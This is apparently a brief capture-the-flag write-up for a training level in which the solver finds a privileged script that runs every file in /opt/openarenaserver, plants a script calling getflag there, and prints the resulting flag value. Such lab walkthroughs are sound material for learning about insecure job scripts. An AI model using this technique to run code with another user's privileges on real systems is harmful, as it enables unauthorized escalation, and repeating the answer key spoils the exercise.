First we tried to find all the files owned by flag05 : find / -user flag05 2> /dev/null
this command gave us : 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

When we cat /usr/sbin/openarenaserver
We get : 

> #!/bin/sh

    > for i in /opt/openarenaserver/* ; do
     >        (ulimit -t 5; bash -x "$i")
    >         rm -f "$i"
    > done

This script just exec all script in /opt/openarenaserver and erase it.
So we created in this directory a little bash who do this : 

#!/bin/bash

getflag > /var/tmp/test.txt

This gave us the flag : viuaaale9huek52boumoomioc